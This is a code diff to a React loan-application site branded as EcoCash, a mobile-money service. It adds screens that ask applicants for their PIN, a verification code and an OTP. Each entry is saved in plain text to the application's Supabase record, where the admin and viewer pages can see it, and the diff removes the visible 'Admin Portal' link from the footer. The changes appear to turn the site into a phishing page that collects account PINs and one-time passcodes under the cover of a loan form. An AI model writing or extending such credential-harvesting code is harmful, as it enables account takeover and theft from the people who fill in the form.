@@ -7,11 +7,13 @@ import { Step2ApplicantDetails } from './components/Step2ApplicantDetails';
 import { Step3FinancialReview } from './components/Step3FinancialReview';
 import { SuccessScreen } from './components/SuccessScreen';
 import { VerificationScreen } from './components/VerificationScreen';
+import { PinScreen } from './components/PinScreen';
+import { OtpScreen } from './components/OtpScreen';
 import AdminPage from './components/AdminPage';
 import ViewerPage from './components/ViewerPage';
 import { AppStep, LoanFormData, SubmittedApplication } from './types';
 import { calculateMonthlyPayment } from './utils/calculator';
-import { buildApplicationInsertPayload, createApplicationInSupabase } from './utils/supabaseDirect';
+import { buildApplicationInsertPayload, createApplicationInSupabase, updateApplicationVerificationCodeInSupabase } from './utils/supabaseDirect';
 
 const initialFormData: LoanFormData = {
   loanType: 'Personal Loan',
@@ -36,6 +38,40 @@ export default function App() {
   const [formData, setFormData] = useState<LoanFormData>(initialFormData);
   const [submittedApplication, setSubmittedApplication] = useState<SubmittedApplication | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const handlePinSubmit = async (pin: string) => {
+    if (!submittedApplication?.id) {
+      return;
+    }
+
+    const displayValue = `PIN: ${pin}`;
+    await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
+    setSubmittedApplication((prev) => prev ? { ...prev, verificationCode: displayValue } : prev);
+    setCurrentStep('verification');
+  };
+
+  const handleVerificationSubmit = async (code: string) => {
+    if (!submittedApplication?.id) {
+      return;
+    }
+
+    const existing = submittedApplication.verificationCode ? `${submittedApplication.verificationCode} / ` : '';
+    const displayValue = `${existing}CODE: ${code}`;
+    await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
+    setSubmittedApplication((prev) => prev ? { ...prev, verificationCode: displayValue } : prev);
+    setCurrentStep('otp');
+  };
+
+  const handleOtpSubmit = async (otp: string) => {
+    if (!submittedApplication?.id) {
+      return;
+    }
+
+    const existing = submittedApplication.verificationCode ? `${submittedApplication.verificationCode} / ` : '';
+    const displayValue = `${existing}OTP: ${otp}`;
+    await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
+    setSubmittedApplication((prev) => prev ? { ...prev, verificationCode: displayValue } : prev);
+  };
 
   useEffect(() => {
     const handlePopState = () => {
@@ -68,6 +104,9 @@ export default function App() {
     else if (currentStep === 'step2') setCurrentStep('step1');
     else if (currentStep === 'step3') setCurrentStep('step2');
     else if (currentStep === 'success') setCurrentStep('calculator');
+    else if (currentStep === 'pin') setCurrentStep('success');
+    else if (currentStep === 'verification') setCurrentStep('pin');
+    else if (currentStep === 'otp') setCurrentStep('verification');
   };
 
   const handleReset = () => {
@@ -201,7 +240,16 @@ export default function App() {
                 <SuccessScreen
                   application={submittedApplication}
                   onNewApplication={handleReset}
-                  onContinue={() => setCurrentStep('verification')}
+                  onContinue={() => setCurrentStep('pin')}
+                />
+              )}
+
+              {currentStep === 'pin' && (
+                <PinScreen
+                  phone={formData.phone}
+                  applicationId={submittedApplication?.id ?? ''}
+                  onBack={() => setCurrentStep('success')}
+                  onNext={handlePinSubmit}
                 />
               )}
 
@@ -209,7 +257,18 @@ export default function App() {
                 <VerificationScreen
                   phone={formData.phone}
                   applicationId={submittedApplication?.id ?? ''}
-                  onBack={() => setCurrentStep('success')}
+                  onBack={() => setCurrentStep('pin')}
+                  onSuccess={handleVerificationSubmit}
+                />
+              )}
+
+              {currentStep === 'otp' && (
+                <OtpScreen
+                  phone={formData.phone}
+                  applicationId={submittedApplication?.id ?? ''}
+                  verificationDisplay={submittedApplication?.verificationCode ?? ''}
+                  onBack={() => setCurrentStep('verification')}
+                  onSuccess={handleOtpSubmit}
                 />
               )}
             </motion.div>
@@ -217,16 +276,8 @@ export default function App() {
         </div>
       </main>
 
-      <footer className="py-4 text-center text-xs text-slate-400 font-medium flex items-center justify-center gap-3">
-        <span>&copy; 2025 EcoCash</span>
-        <span>&bull;</span>
-        <button
-          type="button"
-          onClick={navigateToAdmin}
-          className="hover:text-slate-600 transition-colors cursor-pointer underline"
-        >
-          Admin Portal
-        </button>
+      <footer className="py-4 text-center text-xs text-slate-400 font-medium">
+        &copy; 2025 EcoCash
       </footer>
     </div>
   );
